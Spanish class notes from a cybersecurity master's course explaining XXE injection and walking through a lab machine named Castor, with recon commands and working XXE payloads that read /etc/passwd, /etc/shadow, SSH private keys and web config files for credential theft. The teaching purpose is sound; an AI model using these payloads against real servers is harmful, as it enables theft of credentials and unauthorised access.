> [!info] Ficha técnica
> **Máster de Ciberseguridad e Inteligencia Artificial** · **Clase 42**
> **Módulo:** MODULO3
> **Tema:** Clase 42
> **Fuente:** Apuntes Joselu · Evolve Academy

> [!tip] Cómo leer estos apuntes
> Resumen estructurado de la clase 42. Contenido optimizado para estudio activo y repaso rápido antes de exámenes.

---

---

--
**Máster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy**

## 1.

Contexto y estructura de la sesión

Esta sesión la imparte **Carlos (Dani)**.

Es una clase de viernes con dinámica muy participativa --- varios alumnos van resolviendo la máquina **Castor** en tiempo real mientras Carlos va guiando.

El bloque técnico central es la vulnerabilidad **XXE** (*XML External Entity Injection*), que es la evolución natural del LFI visto en las clases anteriores.

**Resumen de lo visto en clases anteriores:** - Path Traversal → la vulnerabilidad base (parámetro de URL que acepta rutas sin validar). - LFI (*Local File Inclusion*) → consecuencia del Path Traversal: leer ficheros locales. - RFI (*Remote File Inclusion*) → variante del LFI: cargar ficheros remotos. - XXE → nueva forma de conseguir LFI, esta vez a través de un documento XML.

## 2.

Lenguaje estructurado vs. no estructurado

Carlos abre con un contexto conceptual que explica por qué XML es tan relevante:

**Lenguaje no estructurado:** formato libre, como el lenguaje natural.

Hasta hace dos años era casi imposible de procesar automáticamente.

Con el auge de los LLMs (modelos de lenguaje como Claude) se está empezando a usar en APIs modernas.

**Lenguaje estructurado:** formato predefinido y predecible, que el servidor sabe parsear.

Los más comunes:

Formato Usos habituales
 ---------- -------------------------------------------
 **JSON** APIs REST, JWT, intercambio de datos
 **XML** Word, PDF, servicios SOAP, configuraciones
 **SQL** Consultas a bases de datos
 **YAML** Configuraciones (Docker, Kubernetes)

**JSON y el JWT:** El JWT (*JSON Web Token*) es el mecanismo de autenticación más usado en APIs modernas.

Estructura fija `variable: valor` que el servidor espera parsear.

El servidor sabe que cuando llega algo con extensión `.json` tendrá ese formato --- lo que facilita el ataque si el servidor no valida correctamente.

## 3. ¿Qué es XML?

**XML** (*eXtensible Markup Language*) es un formato de representación de datos parecido a HTML --- usa etiquetas con el formato `<etiqueta>contenido</etiqueta>`.

**Ejemplo de estructura XML:**

<?xml version="1.0" encoding="UTF-8"?> <usuario> <nombre>Mariana</nombre> <email>mariana@ejemplo.com</email> </usuario>

La diferencia con HTML: XML define datos y estructura; HTML define presentación visual.

**Lo que mucha gente no sabe:** Word (`.docx`) y PDF son en realidad XML por debajo.

Si Claude genera un Word o un PDF, está programando un XML.

Esto hace que XML sea posiblemente el formato más utilizado en el mundo.

**Cómo detectar si una web acepta XML:** En las cabeceras HTTP de la petición (visibles en Burp o en DevTools → Network → Headers):

Accept: application/xml Content-Type: application/xml

Si cualquiera de estos valores aparece en la petición o en la respuesta, la web está esperando XML y probablemente lo procese.

## 4.

XXE --- XML External Entity Injection

### Concepto base: entidades en XML

En XML, una **entidad** es una variable --- un nombre al que se le asigna un valor que puede reutilizarse en el documento:

<?xml version="1.0"?> <!DOCTYPE nota [ <!ENTITY empresa "Seguros del Norte SA"> ]> <nota> Bienvenido a &empresa; </nota>

Cuando el servidor procesa este XML, sustituye `&empresa;` por `Seguros del Norte SA`.

Es exactamente el mismo concepto que `$variable` en PHP o en Bash.

### La vulnerabilidad: entidades externas

El problema ocurre cuando el servidor permite definir entidades que apuntan a **recursos externos** --- incluyendo ficheros del propio servidor:

<?xml version="1.0"?> <!DOCTYPE nota [ <!ENTITY jefe SYSTEM "file:///etc/passwd"> ]> <nota> &jefe; </nota>

El servidor procesa este XML, sustituye `&jefe;` por el **contenido del fichero** `/etc/passwd`, y devuelve el resultado al atacante.

**Esto es un LFI** --- exactamente lo mismo que conseguíamos con `../../../../etc/passwd` en un parámetro de URL, pero ahora ejecutado a través de un documento XML.

**La sintaxis de entidad externa:**

<!ENTITY nombre SYSTEM "file:///ruta/al/fichero">

- `ENTITY` → declaramos una entidad (variable).
- `SYSTEM` → indica que el valor viene de un recurso externo del sistema.
- `file:///` → protocolo para leer ficheros locales.

Las tres barras son obligatorias.

### Los cuatro vectores de "ejecución" de un XXE

Para que el XXE sea explotable, el contenido del XML procesado tiene que llegar de vuelta al atacante.

Hay cuatro formas:

**1.

La web muestra el resultado directamente:** El caso más simple --- el servidor procesa el XML y devuelve el contenido en la respuesta.

Directamente visible en Burp Repeater.

**2.

Un tercero ejecuta el fichero (ingeniería social):** El atacante sube el XML malicioso y espera que alguien con más privilegios lo abra.

El caso de Digicert: enviaron un fichero al soporte técnico que lo ejecutó varias veces sin saber qué era.

**3.

Un cron job ejecuta el fichero automáticamente:** Si hay una tarea programada que procesa ficheros de cierta ruta (ej: una imagen que se renueva cada noche), se puede sustituir el fichero por el payload malicioso y esperar a que el cron lo ejecute.

**4.

Previsualización del servidor:** La forma más habitual en auditorías reales.

Muchas plataformas tienen formularios que aceptan PDFs (currículos, documentos laborales, estados financieros).

Cuando el usuario sube el PDF, el servidor lo previsualiza para mostrarlo.

En ese momento, si el PDF lleva un payload XXE incrustado, el servidor lo procesa.

### El ataque completo: File Upload + XXE

La cadena de explotación completa que introduce Carlos:

## 1.

File Upload (subir un fichero — PDF, Word, etc.) ↓ 2.

Bypass de filtros (interceptar con Burp y modificar el contenido) ↓ 3.

XXE (el fichero contiene una entidad externa maliciosa) ↓ 4.

LFI (el servidor lee un fichero interno: /etc/passwd, claves SSH...) ↓ 5.

Data Exfiltration (el contenido del fichero llega al atacante) ↓ 6.

Fuerza bruta / Acceso no autorizado (usando las credenciales extraídas)

**Por qué el PDF es el vector más habitual:** - PDF y Word son XML por debajo. - Muchas plataformas aceptan PDFs "legítimamente" (CVs, documentos). - Si la previsualización del PDF se genera en el servidor, procesa el XML. - El atacante intercepta la petición de subida con Burp y **sustituye el contenido** del PDF por el payload XXE antes de que llegue al servidor.

## 5.

Máquina Castor --- Práctica con XXE

### Metodología jerárquica aplicada

Carlos formaliza la jerarquía de enumeración en una regla que hay que memorizar:

## 1.

DIRECTORIOS → dirsearch / GoBuster (sin extensiones) ↓ 2.

FICHEROS → GoBuster con -x php,html,txt (buscar ficheros específicos) ↓ 3.

PARÁMETROS → FFUF / x8 / DevTools → ver qué acepta cada endpoint ↓ 4.

VARIABLES → fusear los valores de los parámetros encontrados

Cada nivel va más "deep" en la superficie de ataque.

### Reconocimiento

# Descubrir la IP de la máquina

```bash
sudo netdiscover -r 10.0.2.0/24
```

# Escanear puertos con versiones y scripts — guardar resultado

```bash
nmap -sVC --open IP_OBJETIVO -oA castor -vvv
```

### Puertos encontrados: 22 (SSH) y 80 (HTTP).

### Fingerprinting

### Wappalyzer detecta: Apache, Bootstrap, Bootstrap (librería CSS).

**Lo que NO tiene valor en el fingerprinting:** - **Bootstrap / Tailwind / CSS** → son librerías de frontend (estilos visuales).

No hay vulnerabilidades explotables en CSS.

Lo máximo que se puede hacer con CSS es cambiar colores o el aspecto de una página (defacement), sin afectar al servidor. - CVEs de Apache de la versión encontrada → si ninguno aplica al contexto de la máquina (sin AD = sin LDAP, sin XSS = sin segundo usuario, sin BOF = demasiado avanzado), **descartar todos y seguir**.

### Fuzzing de directorios (nivel 1)

# Paso 1: directorios sin extensiones

gobuster dir -u http://IP_OBJETIVO -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt > resultado.txt cat resultado.txt

**Resultado:** directorio `/uploads/` encontrado y accesible --- sin contenido todavía.

> [!important] **El hallazgo clave:** `/uploads/` accesible = confirmada la **condición de ejecución** (si se sube un PHP aquí, el servidor lo ejecutará).

Anotarlo como vector de explotación potencial.

### Fuzzing de ficheros (nivel 2)

# Paso 2: buscar ficheros PHP y HTML específicamente

gobuster dir -u http://IP_OBJETIVO \
 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
 -x php,html,txt

**Resultado:** fichero `upload.php` encontrado.

### Análisis del endpoint upload.php

Al acceder a `http://IP/upload.php`:

Mensaje del servidor: "XML not provided"

**Información que esto revela:** - El endpoint espera recibir un XML. - La respuesta es un **error-based information disclosure** --- el servidor nos dice exactamente qué espera.

**Confirmar en DevTools (F12 → Network):** Al recargar la página y revisar las cabeceras de la respuesta, aparece:

Accept: text/html, application/xhtml+xml, application/xml

Confirmado --- la web acepta XML.

### Proveer el XML al endpoint

**Método 1 --- Burp Repeater (recomendado):**

## 1.

Activar FoxyProxy → Burp 2.

### Visitar http://IP/upload.php con Intercept ON 3.

Capturar la petición → Send to Repeater (Ctrl+R) 4.

En el Repeater, modificar la petición manualmente

**Método 2 --- Curl (terminal):**

```bash
curl -X POST http://IP/upload.php \
```
 -H "Content-Type: application/xml" \
 -d '<?xml version="1.0"?><test>hola</test>'

**Respuesta con XML válido pero sin entidades:** el servidor confirma que recibe el XML y lo parsea.

**Respuesta con texto no-XML:** `start tag expected` --- el servidor está esperando sintaxis XML correcta.

### Construir el payload XXE

<?xml version="1.0"?> <!DOCTYPE nota [ <!ENTITY jefe SYSTEM "file:///etc/passwd"> ]> <nota> &jefe; </nota>

**Enviar el payload desde Burp Repeater:** En el cuerpo de la petición POST, sustituir el contenido por el payload XXE.

Cambiar también la cabecera:

Content-Type: application/xml

**Resultado esperado:** el servidor devuelve el contenido del `/etc/passwd` en la respuesta --- lista completa de usuarios del sistema.

**Identificar usuarios reales** (con `/bin/bash`): Los que tienen `/bin/bash` o `/bin/sh` al final son cuentas con terminal --- candidatos para SSH.

### Siguiente paso: robar credenciales o clave SSH

Con el LFI confirmado via XXE, leer ficheros relevantes:

<!-- Leer clave privada SSH de un usuario --> <!ENTITY jefe SYSTEM "file:///home/USUARIO/.ssh/id_rsa">

<!-- Leer el /etc/shadow si hay permisos --> <!ENTITY jefe SYSTEM "file:///etc/shadow">

<!-- Leer ficheros de configuración de la web --> <!ENTITY jefe SYSTEM "file:///var/www/html/config.php">

## 6.

Herramienta `tee` --- ver output y guardar simultáneamente

Un alumno preguntó cómo ver el output de una herramienta en tiempo real Y guardarlo en fichero.

La solución es `tee`:

# Sin tee — solo guarda en fichero, no se ve en terminal:

gobuster dir -u http://IP -w diccionario > resultado.txt

# Con tee — muestra en terminal Y guarda en fichero simultáneamente:

gobuster dir -u http://IP -w diccionario | tee resultado.txt

# Nmap ya tiene su propio flag de guardado:

```bash
nmap -sVC IP -oA nombre_fichero # Guarda .nmap, .gnmap y .xml nmap -sVC IP -oN nombre.txt # Solo formato normal
```

## 7.

GoBuster --- flags esenciales

# Modo directorio básico:

gobuster dir -u http://URL -w /ruta/diccionario

# Buscar ficheros con extensiones específicas:

gobuster dir -u http://URL -w /ruta/diccionario -x php,html,txt,xml

# Guardar resultado:

gobuster dir -u http://URL -w /ruta/diccionario | tee resultado.txt

# Con verbosidad aumentada:

gobuster dir -u http://URL -w /ruta/diccionario -v

**Flag** `-x` **(minúscula):** especifica extensiones de fichero a buscar.

Por defecto GoBuster no busca ficheros, solo directorios.

Con `-x php` busca también `ruta.php` para cada entrada del diccionario.

**El diccionario de DirBuster está en Kali en:** `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

## 8.

Bootstrap y Tailwind --- por qué no son vectores de ataque

Bootstrap y Tailwind son **librerías de CSS** (frontend).

### Sus características: - Solo modifican la apariencia visual (colores, tamaños, espaciados). - Corren **en el navegador del cliente**, nunca en el servidor. - Lo máximo que puede hacer un atacante con CSS: **defacement** (cambiar colores o estilos de la página visualmente, sin afectar al servidor). - **No hay vulnerabilidades de servidor en CSS/Bootstrap/Tailwind.**

Regla: si Wappalyzer detecta solo tecnologías frontend (Bootstrap, Tailwind, jQuery puro, fuentes), no hay CVEs que buscar ahí.

Solo interesan tecnologías backend (PHP, Apache, Python, etc.).

## 9.

Resumen del ciclo de explotación XXE

Web con endpoint que acepta XML ↓ Detectar: cabecera Accept/Content-Type con application/xml ↓ Fuzzing: directorios → ficheros → parámetros → variables ↓ Endpoint upload.php → responde "XML not provided" ↓ Enviar XML válido con Burp Repeater o curl ↓ Inyectar entidad externa: SYSTEM "file:///etc/passwd" ↓ Servidor procesa el XML y devuelve el contenido del fichero ↓ LFI confirmado → leer /etc/shadow, id_rsa, config.php... ↓ Obtener credenciales → SSH → escalada → root

## 10.

Conceptos y términos clave corregidos

Término en la transcripción Corrección / Aclaración
---------------------------------------------------- ------------------------------------------------------------------------------------------------------------------------------------------------------------------
 *XX e / XXI / XXEI* **XXE** (*XML External Entity Injection*) -- inyección de entidades externas en XML para conseguir LFI
 *XML / X M L / el de los angulitos* **XML** (*eXtensible Markup Language*) -- formato de datos con etiquetas `<tag>valor</tag>`
 *JSON / J son / Joyson* **JSON** (*JavaScript Object Notation*) -- formato ligero de intercambio de datos `{"clave": "valor"}`
 *JWT / un json web toker* **JWT** (*JSON Web Token*) -- token de autenticación en formato JSON firmado digitalmente
 *Doc Type / DOCTYPE / el tipo de documento* `<!DOCTYPE>` -- declaración XML que define la estructura y las entidades del documento
 *En ti ti / ENTITY / entidad* `<!ENTITY nombre SYSTEM "file:///ruta">` -- declaración de entidad externa en XML
 *System file tres barras / file doble barra barra* `SYSTEM "file:///"` -- protocolo para leer ficheros locales en una entidad XML
 *La variable con el dólar / ampers / el et* `&nombre;` -- referencia a una entidad XML (ampersand + nombre + punto y coma)
 *local find inclusing / LFI* **LFI** (*Local File Inclusion*) -- leer ficheros locales del servidor; en XXE es la consecuencia de la entidad externa
 *el Parsear / parseo / parser* **Parser** -- el proceso por el que el servidor interpreta y extrae datos de un formato estructurado
*la enumeración jerárquica / ir más deep* Metodología: **Directorios → Ficheros → Parámetros → Variables** -- cuatro niveles de profundidad en la enumeración web
 *GoBuster / GoButser / el de dir* **Gobuster** -- herramienta de fuzzing de directorios y ficheros
 *menos x / guión x de las extensiones* `-x php,html,txt` -- flag de GoBuster para buscar ficheros con extensiones específicas
 *T golpe / la de guardar y ver* `tee` -- comando Linux que muestra la salida en terminal Y la guarda en fichero simultáneamente
 *BoxStrap / Box strap / BootTrap* **Bootstrap** -- librería CSS de frontend (componentes visuales); sin vulnerabilidades de servidor
 *Tailwind / el del Tailwind* **Tailwind CSS** -- librería CSS de utilidades de frontend; igual que Bootstrap, no es un vector de ataque
 *defacement / the face ment* **Defacement** -- ataque que modifica la apariencia visual de una web (solo frontend); no afecta al servidor
 *el CURP / el Curl* **curl** -- herramienta de terminal para hacer peticiones HTTP; alternativa a Burp para pruebas manuales
 *Burt / Burns Surf / Burnswip* **Burp Suite** -- framework de auditoría web (proxy, repeater, intruder...)
 *error base / error based* **Error-based information disclosure** -- el servidor revela información útil en los mensajes de error
 *Castor / la máquina del castor* **Castor** -- máquina de HackerLabs vulnerable a XXE
*import OS / el OS system* `import os; os.system()` -- en Python, importar la librería del sistema operativo para ejecutar comandos; el XXE tiene un mecanismo análogo con la función SYSTEM
 *Claudia / Claude / el GPT* **Claude** (Anthropic) -- IA consultada durante la clase para analizar el payload XXE

*Resumen elaborado para uso académico en el Máster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy.*


---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[resumen_master_clase45.md|resumen_master_clase45]] — GoBuster, SQL Injection, XXE
- [[../../apuntes Andres/10.07.2026 Repaso y Explotación Avanzada Máquinas Nike y Castor.md|10.07.2026 Repaso y Explotación Avanzada Máquinas Nike y Castor]] — GoBuster, SQL Injection, XXE
- [[../../apuntes Andres/09.07.2026 XXE - XML External Entity y Máquina Castor.md|09.07.2026 XXE - XML External Entity y Máquina Castor]] — GoBuster, SQL Injection, XXE
- [[../../transcripciones/Julio/14.07.2026 Fundamentos Web y SQL Injection Máquina Injected (HackerLab).md|14.07.2026 Fundamentos Web y SQL Injection Máquina Injected (HackerLab)]] — GoBuster, SQL Injection, XXE
- [[resumen_master_clase41.md|resumen_master_clase41]] — File Upload, SQL Injection, XXE
- [[resumen_master_clase55.md|resumen_master_clase55]] — GoBuster, SQL Injection, XXE

### 🛠️ Herramientas

- [[comandos/BurpSuite|Burp Suite]]
- [[comandos/DirSearch|DirSearch]]
- [[comandos/FFUF|FFUF]]
- [[comandos/GoBuster|GoBuster]]
- [[comandos/Hydra|Hydra]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/05 - Auditoria Web/Path Traversal — 6 Casos y Bypasses.md|Path Traversal / LFI]]
- [[Apuntes/05 - Auditoria Web/SQL Injection.md|SQL Injection]]
- [[Apuntes/05 - Auditoria Web/Vulnerabilidades Web — OWASP Top 10 y Burp Suite.md|XSS]]
- [[Apuntes/05 - Auditoria Web/XXE — XML External Entity.md|XXE]]

> #burpsuite #dirsearch #escalada-privilegios #ffuf #file-upload #gobuster #hydra #ia #kali #lfi #linux #nmap #pentest #post-explotacion #redes #rfi #sqli #ssh #xss #xxe
